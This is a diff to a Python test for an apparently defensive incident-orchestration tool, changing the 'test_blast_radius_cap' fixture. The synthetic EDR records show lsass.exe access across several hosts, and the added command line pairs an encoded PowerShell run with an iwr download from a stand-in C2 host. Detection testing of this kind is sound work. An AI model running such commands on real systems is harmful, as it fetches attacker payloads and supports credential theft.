@@ -144,7 +144,7 @@ def test_blast_radius_cap(policy):
     t = "2026-10-08T09:{:02d}:00Z"
     recs = [{"source": "edr", "event_type": "process_access", "timestamp": t.format(i), "host": f"ws-{i}",
              "user": "svc_shared", "process": "m.exe", "target": "lsass.exe", "severity": "critical",
-             "cmdline": "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA"} for i in range(5)]
+             "cmdline": "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA; iwr http://spread-c2.xyz/p"} for i in range(5)]
     recs += [{"source": "windows_security", "EventID": 1102, "timestamp": t.format(6), "Computer": "ws-0"},
              {"source": "windows_security", "EventID": 4697, "timestamp": t.format(7), "Computer": "ws-0", "ServiceName": "x"}]
     inc = Orchestrator(strict, Store(), Enricher(LocalFeedProvider(sample_feed_path()))).run(recs).incidents[0]
